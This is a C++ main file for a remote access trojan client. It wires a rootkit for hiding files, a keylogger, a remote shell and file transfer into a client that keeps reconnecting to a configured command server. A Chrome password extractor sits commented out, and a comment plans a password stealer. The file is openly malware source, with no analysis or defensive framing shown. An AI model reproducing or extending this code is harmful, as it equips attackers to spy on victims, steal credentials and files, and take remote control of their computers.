#include "common.h"
#include "Client.h"
#include "Keylogger.h"
#include "RemoteShell.h"
#include "FileTransfer.h"
#include "../r77/r77.h"

#include "../PasswordExtractor/libpasscat.h"

int main(int argc, char *argv[])
{
	/*libpasscat::init();
	libpasscat::cat_chrome_passwords();
	libpasscat::finalize(); */

	/* for hidding file */
	if(Settings::useR77)
		Rootkit::Initialize();

	/* keylogger */
	Keylogger* kl = nullptr;
	if (Settings::use_keylogger) {
		kl = new Keylogger{argv[0]};
	}

	//create a client 
	Client cli{ Settings::server_ip, Settings::server_port };

	/* register cmds for keylogger */
	if (kl)
		cli.RegisterHook({ CMD_GET_KEYS }, kl);

	/* register remoteshell module */
	RemoteShell rs{};
	cli.RegisterHook({ CMD_START_SHELL, CMD_STOP_SHELL }, &rs);

	/* File transfer module */
	FileTransfer ft{};
	cli.RegisterHook({ CMD_FILE_DOWNLOAD, CMD_FILE_UPLOAD, CMD_EXPLORER_LIST }, &ft);

	/* TODO: remote desktop & password stealer */

	/* main loop to keep the client alive and trying to connect */
	while (true) {
		if(!cli.IsConnected())
			cli.Connect();
		Sleep(Settings::timeout);
	}

	delete kl;
	//never reached for now
	return 0;
}